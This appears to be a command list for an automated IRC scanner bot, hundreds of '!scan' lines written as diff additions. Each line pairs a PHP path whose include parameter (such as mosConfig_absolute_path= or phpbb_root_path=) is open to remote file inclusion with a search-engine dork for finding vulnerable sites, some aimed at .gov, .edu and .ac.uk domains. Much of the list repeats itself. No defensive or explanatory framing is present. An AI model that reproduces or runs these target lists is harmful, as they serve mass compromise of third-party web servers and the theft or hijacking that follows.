+!scan index.php?_REQUEST=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1&GLOBALS=&mosConfig_absolute_path= "Mambo is"
+!scan ndex.php?p= inurl:"edu/index.php?p=*.php"
+!scan /modules/xgallery/upgrade_album.php?GALLERY_BASEDIR= allinurl:/xgallery/
+!scan index.php?x= inurl:"com/index.php?x=*.php"
+!scan index.php?mode= inurl:"com/index.php?mode=*.php"
+!scan index.php?stranica= inurl:"index.php?stranica="
+!scan index.php?sub= inurl:"il/index.php?sub=*.php"
+!scan index.php?id= inurl:"/index.php?id=*.php"
+!scan index.php?t= inurl:"/index.php?t=*.php"
+!scan index.php?r= inurl:"index.php?r=*.php"
+!scan index.php?menu= inurl:"net/index.php?menu=*.php"
+!scan index.php?pag= inurl:"com/index.php?pag=*.php"
+!scan solpot.html?body= allinurl: "solpot.html?body"  
+!scan port.php?content= inurl:port.php?content=*.php"
+!scan index0.php?show= inurl:index0.php?show=*.php"
+!scan administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path= inurl:/index.php?option=com_comprofiler"
+!scan /tools/send_reminders.php?includedir= allinurl:day.php?date=  inurl:/day.php?date=
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:/index.php?option=com_remository
+!scan /tags.php?BBCodeFile= intitle:"Tagger LE" inurl:tags.php site:br
+!scan administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path= inurl:/index.php?option=com_comprofiler"
+!scan content.php?page= inurl:"*content.php?page=*.php"
+!scan index.php?topic= inurl:"/index.php?topic=*.php"
+!scan index.php?u= inurl:"/index.php?u=*.php"
+!scan administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path= inurl:"com_linkdirectory"
+!scan administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir= inurl:".tr./components"
+!scan modules/My_eGallery/index.php?basepath= inurl:"My_eGallery"
+!scan /modules/vwar/admin/admin.php?vwar_root= inurl:"vwar" 
+!scan index.php?loc= allinurl:.br/index.php?loc=
+!scan administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path= inurl:"us/index.php?option=com_comprofiler"
+!scan administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir= inurl:"com_cropimage"
+!scan /tags.php?BBCodeFile= intitle:"Tagger LE" inurl:tags.php
+!scan myevent.php?myevent_path= inurl:myevent.php
+!scan /administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path= allinurl:"com_uhp"
+!scan myevent.php?myevent_path= inurl:"uk/myevent.php
+!scan includes/functions.php?phpbb_root_path= powered by Integramod
+!scan m2f/m2f_phpbb204.php?m2f_root_path= allinurl:/m2f_usercp.php?
+!scan /tags.php?BBCodeFile= intitle:"Tagger LE" inurl:"uk/tags.php
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:"us/index.php?option=com_remository
+!scan show.php?path= inurl:fclick
+!scan show.php?path= inurl:.ac.uk/fclick
+!scan administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path= inurl:".de.*/com_linkdirectory"
+!scan administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site= inurl:"com_a6mambocredits"
+!scan index.php?template= inurl:"index.php?"
+!scan search.php?cutepath= inurl:"search.php?"
+!scan show_news.php?cutepath= inurl:"show_news.php?"
+!scan page.php?doc= allinurl:"page.php?doc="
+!scan administrator/components/com_webring/admin.webring.docs.php?component_dir= inurl:"com_webring"
+!scan administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=  inurl:".de.*/com_mgm"
+!scan help.php?css_path= inurl:phplive site:.ru
+!scan components/com_galleria/galleria.html.php?mosConfig_absolute_path= inurl:"com_galleria/"
+!scan big.php?pathtotemplate= inurl:".de.*"big.php?"
+!scan includes/search.php?GlobalSettings[templatesDirectory]= inurl:".com"search.php?"
+!scan interna/tiny_mce/plugins/ibrowser/ibrowser.php?tinyMCE_imglib_include= "Papoo CMS"
+!scan /functions.php?include_path= "powered by: phpecard"
+!scan modules/My_eGallery/index.php?basepath= inurl:".de.*"My_eGallery"
+!scan components/com_galleria/galleria.html.php?mosConfig_absolute_path= inurl:".net.*"com_galleria/"
+!scan /includes/orderSuccess.inc.php?glob=1&cart_order_id=1&glob[rootDir]= "powered by CubeCart 3.0.6"      
+!scan /class.mysql.php?path_to_bt_dir= "powered by paBugs 2.0 Beta 3"   
+!scan /include/footer.inc.php?_AMLconfig[cfg_serverpath]= "powered by AllMyLinks"
+!scan /squirrelcart/cart_content.php?cart_isp_root= allinurl:/squirrelcart/  
+!scan index2.php?to= inurl:"/index2.php?to=*.php"
+!scan index.php?load= inurl:"/index.php?load=*.php"
+!scan home.php?pagina= inurl:"home.php?pagina="
+!scan /modules/coppermine/include/init.inc.php?CPG_M_DIR= allinurl:modules.php?name=coppermine
+!scan /modules/Forums/admin/admin_styles.php?phpbb_root_path= allinurl:modules.php?name=forums
+!scan /modules/vwar/admin/admin.php?vwar_root= allinurl:modules.php?name=vwar
+!scan /modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path= allinurl:modules.php?name=PNphpBB2
+!scan /modules/My_eGallery/public/displayCategory.php?basepath= allinurl:modules.php?name=my_egallery
+!scan /modules/xgallery/upgrade_album.php?GALLERY_BASEDIR= allinurl:modules.php?name=xgallery
+!scan /modules/4nAlbum/public/displayCategory.php?basepath= allinurl:modules.php?name=4nAlbum
+!scan /include/write.php?dir= allinurl:/zboard/zboard.php
+!scan db.php?path_local= inurl:"db.php?path_local="
+!scan index.php?site= inurl:"index.php?site="
+!scan index.php?url= inurl:"index.php?url="
+!scan index.php?p= inurl:"index.php?p="
+!scan index.php?openfile= inurl:"index.php?openfile="
+!scan index.php?file= inurl:"index.php?file="
+!scan index.php?go= inurl:"index.php?go="
+!scan index.php?content= inurl:"index.php?content="
+!scan index.php?side= inurl:"index.php?side="
+!scan index.php?kobr= inurl:"index.php?kobr="index.php?pg= inurl:"index.php?pg="
+!scan index.php?doc= inurl:"index.php?doc="
+!scan index.php?l= inurl:"index.php?l="
+!scan index.php?a= inurl:"index.php?a="
+!scan index.php?principal= inurl:"index.php?principal="
+!scan index.php?show= inurl:"index.php?show="
+!scan index.php?opcao= inurl:"index.php?opcao="
+!scan index.php?conteudo= inurl:"index.php?conteudo="
+!scan index.php?meio= inurl:"index.php?meio="
+!scan index.php?inc= inurl:"index.php?inc="
+!scan index.php?c= inurl:"index.php?c="
+!scan index.php?rage= inurl:"index.php?rage="
+!scan index.php?arquivo= inurl:"index.php?arquivo="
+!scan index.php?nic= inurl:"index.php?nic="
+!scan index.php?x= inurl:"index.php?x="
+!scan components/com_mtree/Savant2/Savant2_Plugin_stylesheet.php?mosConfig_absolute_path= inurl:"com_mtree"
+!scan index.php?place= inurl:"index.php?place="
+!scan index.php?show= inurl:"index.php?show="
+!scan index.php?dsp= inurl:"index.php?dsp="
+!scan index.php?dept= inurl:"index.php?dept="
+!scan index.php?lg= inurl:"index.php?lg="
+!scan index.php?inhalt= inurl:"index.php?inhalt="
+!scan index.php?ort= inurl:"index.php?ort="
+!scan index.php?pilih= inurl:"index.php?pilih="
+!scan principal.php?conteudo= inurl:"principal.php?conteudo="
+!scan main.php?site= inurl:"main.php?site="
+!scan template.php?pagina= inurl:"template.php?pagina="
+!scan contenido.php?sec= inurl:"contenido.php?sec="
+!scan index_principal.php?pagina= inurl:"index_principal.php?pagina="
+!scan template.php?name= inurl:"template.php?name="
+!scan forum.php?act= inurl:"forum.php?act="
+!scan home.php?action= inurl:"home.php?action="
+!scan home.php?pagina= inurl:"home.php?pagina="
+!scan noticias.php?arq= inurl:"noticias.php?arq="
+!scan main.php?x= inurl:"main.php?x="
+!scan main.php?page= inurl:"main.php?page="
+!scan default.php?page= inurl:"default.php?page="
+!scan index.php?cont= inurl:"index.php?cont="
+!scan index.php?configFile= inurl:"index.php?configFile="
+!scan index.php?meio.php= inurl:"index.php?meio.php="
+!scan index.php?include= inurl:"index.php?include="
+!scan index.php?open= inurl:"index.php?open=
+!scan index.php?visualizar= inurl:"index.php?visualizar="
+!scan index.php?x= inurl:"index.php?x="
+!scan index.php?pag= inurl:"index.php?pag="
+!scan index.php?cat= inurl:"index.php?cat="
+!scan index.php?action= inurl:"index.php?action="
+!scan index.php?do= inurl:"index.php?do="
+!scan index2.php?x= inurl:"index2.php?x="
+!scan index2.php?content= inurl:"index2.php?content="
+!scan main.php?pagina= inurl:"main.php?pagina="
+!scan index.phpmain.php?x= inurl:"index.phpmain.php?x="
+!scan index.php?link= inurl:"index.php?link="
+!scan index.php?canal= inurl:"index.php?canal="
+!scan index.php?screen= inurl:"index.php?screen="
+!scan index.php?langc= inurl:"index.php?langc="
+!scan services.php?page= inurl:"services.php?page="
+!scan htmltonuke.php?filnavn= inurl:"htmltonuke.php?filnavn="
+!scan ihm.php?p= inurl:"ihm.php?p="
+!scan default.php?page= inurl:"default.php?page="
+!scan folder.php?id= inurl:"folder.php?id="
+!scan index.php?Load= inurl:"index.php?Load="
+!scan index.php?Language= inurl:"index.php?Language="
+!scan hall.php?file= inurl:"hall.php?file="
+!scan hall.php?page= inurl:"hall.php?page="
+!scan template.php?goto= inurl:"template.php?goto="
+!scan video.php?content= inurl:"video.php?content="
+!scan pages.php?page= inurl:"pages.php?page="
+!scan print.php?page= inurl:"print.php?page="
+!scan show.php?page= inurl:"show.php?page="
+!scan view.php?page= inurl:"view.php?page="
+!scan media.php?page= inurl:"media.php?page="
+!scan index1.php?choix= inurl:"index1.php?choix="
+!scan index1.php?menu= inurl:"index1.php?menu"
+!scan index.php?ort= inurl:"index.php?ort="
+!scan index2.php?showpage= inurl:"index2.php?showpage="
+!scan index2.php?ascii_seite= inurl:"index2.php?ascii_seite="
+!scan index2.php?DoAction= inurl:"index2.php?DoAction="
+!scan index2.php?ID= inurl:"index2.php?ID="
+!scan index2.php?url_page= inurl:"index2.php?url_page="
+!scan index1.php?dat= inurl:"index1.php?dat="
+!scan index1.php?site= inurl:"index1.php?site="
+!scan index0.php?show= inurl:"index0.php?show="
+!scan home.php?content= inurl:"home.php?content="
+!scan port.php?content= inurl:"port.php?content="
+!scan main.php?link= inurl:"main.php?link="
+!scan home.php?x= inurl:"home.php?x="
+!scan index1.php?x= inurl:"index1.php?x="
+!scan index2.php?x= inurl:"index2.php?x="
+!scan main.php?x= inurl:"main.php?x="
+!scan homepage.php?sel= inurl:"homepage.php?sel="
+
+
+
+!scan /modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR= allinurl:/xoopsgallery/
+!scan /modules/agendax/addevent.inc.php?agendax_path= allinurl:/agendax/
+!scan /include/main.php?config[search_disp]=true&include_dir= allinurl:/osticket/
+!scan /contrib/yabbse/poc.php?poc_root_path= ntitle:PHPOpenChat ext:php 
+!scan /phpopenchat/contrib/yabbse/poc.php?sourcedir= ntitle:PHPOpenChat ext:php 
+!scan /photoalb/lib/static/header.php?set_menu= allintitle:iPhotoAlbum
+!scan /squito/photolist.inc.php?photoroot= "Squitosoft All Rights Reserved"
+!scan /bz/squito/photolist.inc.php?photoroot= "Squitosoft All Rights Reserved"
+!scan /ppa/inc/functions.inc.php?config[ppa_root_path]= allinurl:**/screens/displayimage.php?pid=*
+!scan /spid/lang/lang.php?lang_path= allinurl:**/spid.php allinurl:**/spid.php?cat=*lang=
+!scan /classes.php?LOCAL_PATH= "powered by siteframe"
+!scan al_initialize.php?alpath= "Powered by AutoLinks Pro"
+!scan /modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]= allinurl:*br*/newbb_plus/*
+!scan /index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path= "Powered by Mambo" inurl:*gov*
+!scan /extensions/moblog/moblog_lib.php?basedir= "powered by pivot" 
+!scan /app/common/lib/codeBeautifier/Beautifier/Core.php?BEAUT_PATH= "phpCodeGenie v. 3.0.2"
+!scan components/com_performs/performs.php?mosConfig_absolute_path= inurl:"com_performs"
+!scan modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]= inurl:"AllMyGuests"
+!scan /components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= allinurl:"com_rsgallery"
+!scan /components/com_smf/smf.php?mosConfig_absolute_path= allinurl:"com_smf"
+!scan /components/com_cpg/cpg.php?mosConfig_absolute_path= index.php?option=com_cpg
+!scan administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path= inurl:"com_peoplebook"
+!scan /admin_modules/admin_module_deldir.inc.php?config[path_src_include]= "Powered by yappa-ng 2.3.1"
+!scan inc/cmses/aedating4CMS.php?dir[inc]= inurl:flashchat site:br bp_ncom.php?bnrep= "Script r?alis? par BinGo PHP"
+!scan /components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path= inurl:"/com_mtree/"
+!scan /jscript.php?my_ms[root]= intitle:"myspeach" inurl:"chat_exemple.php"
+!scan /popup_window.php?site_isp_root= inurl:"Squirrelcart"
+!scan /yabbse/Sources/Packages.php?sourcedir= inurl:Yabbse
+!scan /include/main.php?config[search_disp]=true&include_dir= allinurl:/osticket/ site:fr
+!scan /include/main.php?config[search_disp]=true&include_dir= allinurl:/osticket/ site:uk
+!scan /includes/functions_portal.php?phpbb_root_path= "powered by Integramod"
+!scan historytemplate.php?cms[support]=1&cms[tngpath]= "powered by The Next Generation of Genealogy Sitebuilding"
+!scan /components/com_simpleboard/image_upload.php?sbp= inurl:"com_simpleboard"
+
+!scan /surveys/survey.inc.php?path= inurl:surveys
+!scan index.php?body= inurl:"index.php?body="
+!scan /classes/adodbt/sql.php?classes_dir= allinurl:adobt site:pl
+!scan enc/content.php?Home_Path= "powered by doodle cart"
+!scan /classified_right.php?language_dir= inurl:classified.php phpbazar
+!scan /sources/functions.php?CONFIG[main_path]= "(Powered By ScozNews)"
+!scan /sources/template.php?CONFIG[main_path]= "(Powered By ScozNews)"
+!scan /embed/day.php?path= intitle:"Login to Calendar"
+!scan /includes/dbal.php?eqdkp_root_path= "powered by EQdkp"
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Powered By Aardvark Topsites PHP 4.2.2"
+!scan /includes/kb_constants.php?module_root_path= "Powered by Knowledge Base"
+!scan /mcf.php?content= allinurl:"mcf.php" site:.de
+!scan /components/com_facileforms/facileforms.frame.php?ff_compath= allinurl:"com_facileforms" site:.ar
+!scan skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer CMS"
+!scan /zipndownload.php?PP_PATH= "Powered by: PhotoPost"
+!scan /administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path= inurl:"com_serverstat"
+!scan /components/com_zoom/includes/database.php?mosConfig_absolute_path= inurl:"index.php?option="com_zoom"
+!scan /main.php?sayfa= inurl:"main.php?sayfa="
+!scan /components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= allinurl:com_extended_registration
+!scan /addpost_newpoll.php?addpoll=preview&thispath= allinurl:"/ubbthreads/"
+!scan /header.php?abspath= "MobilePublisherPHP"
+!scan components/com_performs/performs.php?mosConfig_absolute_path= inurl:"com_performs"
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:index.php?option=com_remository
+!scan impex/ImpExData.php?systempath= intext:powered by vbulletin
+!scan /modules/vwar/admin/admin.php?vwar_root= allinurl:vwar site:.com
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "powered by phpCOIN 1.2.3"
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:.com/index.php?option=com_remository
+!scan /tools/send_reminders.php?includedir= allinurl:day.php?date=
+!scan /skin/zero_vote/error.php?dir= skin/zero_vote/error.php
+!scan /modules/TotalCalendar/about.php?inc_dir= allinurl:/TotalCalendar
+!scan /login.php?dir= allinurl:login.php?dir=
+!scan /tags.php?BBCodeFile= intitle:"Tagger LE" inurl:tags.php
+!scan index.php?pageurl= inurl:"index.php?pageurl=*.php"
+!scan /templates/headline_temp.php?nst_inc= allintitle:fusion:news:management:system
+!scan index.php?var= inurl:"index.php?var=*.php"
+!scan index.php?pagina= inurl:"index.php?pagina=*.php"
+!scan index.php?go= inurl:"index.php?go="
+!scan index.php?site= inurl:"index.php?site="
+!scan phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= inurl:"phpwcms/index.php?id="
+!scan administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path= inurl:".com.*/index.php?option=com_comprofiler"
+!scan index.php?pagina= inurl:"index.php?pagina=*.php"
+!scan index.php?id= inurl:"index.php?id=*.php"
+!scan index1.php?= inurl:"index1.php?=*.php?
+!scan index.php?site= inurl:"index.php?site=*.php"
+!scan main.php?id= inurl:"main.php?id=*.php"
+!scan content.php?page= inurl:"content.php?page=*.php"
+!scan admin.php?page= inurl:"admin.php?page=*.php"
+!scan lib/gore.php?libpath= inurl:"/SQuery/"
+!scan SQuery/lib/gore.php?libpath= inurl:"/SQuery/"
+!scan index2.php?p= inurl:"index2.php?p=*.php"
+!scan index1.php?go=  inurl:"index1.php?go=*.php"
+!scan news_detail.php?file= inurl:"news_detail.php?file=*.php"
+!scan old_reports.php?file= inurl:"old_reports.php?file=*.php"
+!scan index.php?x= inurl:"index.php?x=*.php"
+!scan index.php?nic= inurl:"index.php?nic=*.php"
+!scan homepage.php?sel= inurl:"homepage.php?sel=*.php"
+!scan index.php?sel= inurl:"index.php?sel=*.php"
+!scan main.php?x= inurl:"main.php?x=*.php"
+!scan components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path= "inurl:com_artlinks"
+!scan index2.php?x= inurl:index2.php?x=*.php"
+!scan main.php?pagina= inurl:"main.php?pagina=*.php"
+!scan test.php?page= allinurl:test.php?page=
+!scan components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path= "inurl:com_phpshop"
+!scan akocomments.php?mosConfig_absolute_path= inurl:akocomments.php
+!scan index.php?page= inurl:"edu/index.php?page=*.php"
+!scan *.php?page= inurl:*.php?page=*.php"
+!scan index.php?oldal= inurl:"index.php?oldal=*.php"
+!scan index.php?lang=gr&file inurl:"index.php?lang=gr&file=*.php"
+!scan index.php?pag= inurl:"index.php?pag=*.php"
+!scan index.php?incl= inurl:"index.php?incl="
+!scan avatar.php?page= inurl:"avatar.php?page="
+!scan index.php?_REQUEST=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1&GLOBALS=&mosConfig_absolute_path= "Mambo is A Free
+!scan index.php?_REQUEST=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1&GLOBALS=&mosConfig_absolute_path= "Mambo is"
+!scan ndex.php?p= inurl:"edu/index.php?p=*.php"
+!scan /modules/xgallery/upgrade_album.php?GALLERY_BASEDIR= allinurl:/xgallery/
+!scan index.php?x= inurl:"com/index.php?x=*.php"
+!scan index.php?mode= inurl:"com/index.php?mode=*.php"
+!scan index.php?stranica= inurl:"index.php?stranica="
+!scan index.php?sub= inurl:"il/index.php?sub=*.php"
+!scan index.php?id= inurl:"/index.php?id=*.php"
+!scan index.php?t= inurl:"/index.php?t=*.php"
+!scan index.php?r= inurl:"index.php?r=*.php"
+!scan index.php?menu= inurl:"net/index.php?menu=*.php"
+!scan index.php?pag= inurl:"com/index.php?pag=*.php"
+!scan solpot.html?body= allinurl: "solpot.html?body" 
+!scan port.php?content= inurl:port.php?content=*.php"
+!scan index0.php?show= inurl:index0.php?show=*.php"
+!scan administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path= inurl:/index.php?option=com_comprofiler"
+!scan /tools/send_reminders.php?includedir= allinurl:day.php?date=  inurl:/day.php?date=
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:/index.php?option=com_remository
+!scan /tags.php?BBCodeFile= intitle:"Tagger LE" inurl:tags.php site:br
+!scan administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path= inurl:/index.php?option=com_comprofiler"
+!scan content.php?page= inurl:"*content.php?page=*.php"
+!scan index.php?topic= inurl:"/index.php?topic=*.php"
+!scan index.php?u= inurl:"/index.php?u=*.php"
+!scan administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path= inurl:"com_linkdirectory"
+!scan administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir= inurl:".tr./components"
+!scan modules/My_eGallery/index.php?basepath= inurl:"My_eGallery"
+!scan /modules/vwar/admin/admin.php?vwar_root= inurl:"vwar"
+!scan index.php?loc= allinurl:.br/index.php?loc=
+!scan administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path= inurl:"us/index.php?option=com_comprofiler"
+!scan administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir= inurl:"com_cropimage"
+!scan /tags.php?BBCodeFile= intitle:"Tagger LE" inurl:tags.php
+!scan myevent.php?myevent_path= inurl:myevent.php
+!scan /administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path= allinurl:"com_uhp"
+!scan myevent.php?myevent_path= inurl:"uk/myevent.php
+!scan includes/functions.php?phpbb_root_path= powered by Integramod
+!scan m2f/m2f_phpbb204.php?m2f_root_path= allinurl:/m2f_usercp.php?
+!scan /tags.php?BBCodeFile= intitle:"Tagger LE" inurl:"uk/tags.php
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:"us/index.php?option=com_remository
+!scan show.php?path= inurl:fclick
+!scan show.php?path= inurl:.ac.uk/fclick
+!scan administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path= inurl:".de.*/com_linkdirectory"
+!scan administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site= inurl:"com_a6mambocredits"
+!scan index.php?template= inurl:"index.php?"
+!scan search.php?cutepath= inurl:"search.php?"
+!scan show_news.php?cutepath= inurl:"show_news.php?"
+!scan page.php?doc= allinurl:"page.php?doc="
+!scan administrator/components/com_webring/admin.webring.docs.php?component_dir= inurl:"com_webring"
+!scan administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=  inurl:".de.*/com_mgm"
+!scan help.php?css_path= inurl:phplive site:.uk
+!scan components/com_galleria/galleria.html.php?mosConfig_absolute_path= inurl:"com_galleria/"
+!scan big.php?pathtotemplate= inurl:".de.*"big.php?"
+!scan includes/search.php?GlobalSettings[templatesDirectory]= inurl:".com"search.php?"
+!scan interna/tiny_mce/plugins/ibrowser/ibrowser.php?tinyMCE_imglib_include= "Papoo CMS"
+!scan /functions.php?include_path= "powered by: phpecard"
+!scan modules/My_eGallery/index.php?basepath= inurl:".de.*"My_eGallery"
+!scan components/com_galleria/galleria.html.php?mosConfig_absolute_path= inurl:".net.*"com_galleria/"
+!scan /includes/orderSuccess.inc.php?glob=1&cart_order_id=1&glob[rootDir]= "powered by CubeCart 3.0.6"     
+!scan /class.mysql.php?path_to_bt_dir= "powered by paBugs 2.0 Beta 3"
+!scan /include/footer.inc.php?_AMLconfig[cfg_serverpath]= "powered by AllMyLinks"
+!scan /squirrelcart/cart_content.php?cart_isp_root= allinurl:/squirrelcart/ 
+!scan index2.php?to= inurl:"/index2.php?to=*.php"
+!scan index.php?load= inurl:"/index.php?load=*.php"
+!scan home.php?pagina= inurl:"home.php?pagina="
+!scan /modules/coppermine/include/init.inc.php?CPG_M_DIR= allinurl:modules.php?name=coppermine
+!scan /modules/Forums/admin/admin_styles.php?phpbb_root_path= allinurl:modules.php?name=forums
+!scan /modules/vwar/admin/admin.php?vwar_root= allinurl:modules.php?name=vwar
+!scan /modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path= allinurl:modules.php?name=PNphpBB2
+!scan /modules/My_eGallery/public/displayCategory.php?basepath= allinurl:modules.php?name=my_egallery
+!scan /modules/xgallery/upgrade_album.php?GALLERY_BASEDIR= allinurl:modules.php?name=xgallery
+!scan /modules/4nAlbum/public/displayCategory.php?basepath= allinurl:modules.php?name=4nAlbum
+!scan /include/write.php?dir= allinurl:/zboard/zboard.php
+!scan db.php?path_local= inurl:"db.php?path_local="
+!scan index.php?site= inurl:"index.php?site="
+!scan index.php?url= inurl:"index.php?url="
+!scan index.php?p= inurl:"index.php?p="
+!scan index.php?openfile= inurl:"index.php?openfile="
+!scan index.php?file= inurl:"index.php?file="
+!scan index.php?go= inurl:"index.php?go="
+!scan index.php?content= inurl:"index.php?content="
+!scan index.php?side= inurl:"index.php?side="
+!scan index.php?kobr= inurl:"index.php?kobr="index.php?pg= inurl:"index.php?pg="
+!scan index.php?doc= inurl:"index.php?doc="
+!scan index.php?l= inurl:"index.php?l="
+!scan index.php?a= inurl:"index.php?a="
+!scan index.php?principal= inurl:"index.php?principal="
+!scan index.php?show= inurl:"index.php?show="
+!scan index.php?opcao= inurl:"index.php?opcao="
+!scan index.php?conteudo= inurl:"index.php?conteudo="
+!scan index.php?meio= inurl:"index.php?meio="
+!scan index.php?inc= inurl:"index.php?inc="
+!scan index.php?c= inurl:"index.php?c="
+!scan index.php?rage= inurl:"index.php?rage="
+!scan index.php?arquivo= inurl:"index.php?arquivo="
+!scan index.php?nic= inurl:"index.php?nic="
+!scan index.php?x= inurl:"index.php?x="
+!scan components/com_mtree/Savant2/Savant2_Plugin_stylesheet.php?mosConfig_absolute_path= inurl:"com_mtree"
+!scan index.php?place= inurl:"index.php?place="
+!scan index.php?show= inurl:"index.php?show="
+!scan index.php?dsp= inurl:"index.php?dsp="
+!scan index.php?dept= inurl:"index.php?dept="
+!scan index.php?lg= inurl:"index.php?lg="
+!scan index.php?inhalt= inurl:"index.php?inhalt="
+!scan index.php?ort= inurl:"index.php?ort="
+!scan index.php?pilih= inurl:"index.php?pilih="
+!scan principal.php?conteudo= inurl:"principal.php?conteudo="
+!scan main.php?site= inurl:"main.php?site="
+!scan template.php?pagina= inurl:"template.php?pagina="
+!scan contenido.php?sec= inurl:"contenido.php?sec="
+!scan index_principal.php?pagina= inurl:"index_principal.php?pagina="
+!scan template.php?name= inurl:"template.php?name="
+!scan forum.php?act= inurl:"forum.php?act="
+!scan home.php?action= inurl:"home.php?action="
+!scan home.php?pagina= inurl:"home.php?pagina="
+!scan noticias.php?arq= inurl:"noticias.php?arq="
+!scan main.php?x= inurl:"main.php?x="
+!scan main.php?page= inurl:"main.php?page="
+!scan default.php?page= inurl:"default.php?page="
+!scan index.php?cont= inurl:"index.php?cont="
+!scan index.php?configFile= inurl:"index.php?configFile="
+!scan index.php?meio.php= inurl:"index.php?meio.php="
+!scan index.php?include= inurl:"index.php?include="
+!scan index.php?open= inurl:"index.php?open=
+!scan index.php?visualizar= inurl:"index.php?visualizar="
+!scan index.php?x= inurl:"index.php?x="
+!scan index.php?pag= inurl:"index.php?pag="
+!scan index.php?cat= inurl:"index.php?cat="
+!scan index.php?action= inurl:"index.php?action="
+!scan index.php?do= inurl:"index.php?do="
+!scan index2.php?x= inurl:"index2.php?x="
+!scan index2.php?content= inurl:"index2.php?content="
+!scan main.php?pagina= inurl:"main.php?pagina="
+!scan index.phpmain.php?x= inurl:"index.phpmain.php?x="
+!scan index.php?link= inurl:"index.php?link="
+!scan index.php?canal= inurl:"index.php?canal="
+!scan index.php?screen= inurl:"index.php?screen="
+!scan index.php?langc= inurl:"index.php?langc="
+!scan services.php?page= inurl:"services.php?page="
+!scan htmltonuke.php?filnavn= inurl:"htmltonuke.php?filnavn="
+!scan ihm.php?p= inurl:"ihm.php?p="
+!scan default.php?page= inurl:"default.php?page="
+!scan folder.php?id= inurl:"folder.php?id="
+!scan index.php?Load= inurl:"index.php?Load="
+!scan index.php?Language= inurl:"index.php?Language="
+!scan hall.php?file= inurl:"hall.php?file="
+!scan hall.php?page= inurl:"hall.php?page="
+!scan template.php?goto= inurl:"template.php?goto="
+!scan video.php?content= inurl:"video.php?content="
+!scan pages.php?page= inurl:"pages.php?page="
+!scan print.php?page= inurl:"print.php?page="
+!scan show.php?page= inurl:"show.php?page="
+!scan view.php?page= inurl:"view.php?page="
+!scan media.php?page= inurl:"media.php?page="
+!scan index1.php?choix= inurl:"index1.php?choix="
+!scan index1.php?menu= inurl:"index1.php?menu"
+!scan index.php?ort= inurl:"index.php?ort="
+!scan index2.php?showpage= inurl:"index2.php?showpage="
+!scan index2.php?ascii_seite= inurl:"index2.php?ascii_seite="
+!scan index2.php?DoAction= inurl:"index2.php?DoAction="
+!scan index2.php?ID= inurl:"index2.php?ID="
+!scan index2.php?url_page= inurl:"index2.php?url_page="
+!scan index1.php?dat= inurl:"index1.php?dat="
+!scan index1.php?site= inurl:"index1.php?site="
+!scan index0.php?show= inurl:"index0.php?show="
+!scan home.php?content= inurl:"home.php?content="
+!scan port.php?content= inurl:"port.php?content="
+!scan main.php?link= inurl:"main.php?link="
+!scan home.php?x= inurl:"home.php?x="
+!scan index1.php?x= inurl:"index1.php?x="
+!scan index2.php?x= inurl:"index2.php?x="
+!scan main.php?x= inurl:"main.php?x="
+!scan homepage.php?sel= inurl:"homepage.php?sel="
+!scan /modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR= allinurl:/xoopsgallery/
+!scan /modules/agendax/addevent.inc.php?agendax_path= allinurl:/agendax/
+!scan /include/main.php?config[search_disp]=true&include_dir= allinurl:/osticket/
+!scan /contrib/yabbse/poc.php?poc_root_path= ntitle:PHPOpenChat ext:php
+!scan /phpopenchat/contrib/yabbse/poc.php?sourcedir= ntitle:PHPOpenChat ext:php
+!scan /photoalb/lib/static/header.php?set_menu= allintitle:iPhotoAlbum
+!scan /squito/photolist.inc.php?photoroot= "Squitosoft All Rights Reserved"
+!scan /bz/squito/photolist.inc.php?photoroot= "Squitosoft All Rights Reserved"
